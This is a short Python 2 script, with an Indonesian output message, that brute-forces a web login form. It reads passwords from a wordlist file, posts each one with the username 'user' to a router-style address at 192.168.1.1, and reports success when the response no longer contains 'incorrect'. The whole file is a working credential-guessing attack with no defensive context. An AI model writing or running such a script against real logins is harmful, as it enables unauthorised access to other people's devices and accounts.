import requests
import sys

url = "http://192.168.1.1"
expression = "incorrect"
def brute_force(username,password):
  data = {"username":username, "password":password}
  r = requests.post(url, data=data)
  if expression not in r.content:
    print "[+] password telah di temukan:",password
    sys.exit()
  else:
    print r.content," ",password

def main():
  words = [w.strip() for w in open("password.txt", "rb").readlines()]
  for payload in words:
    brute_force("user", payload)


if __name__ == "__main__":
  main()
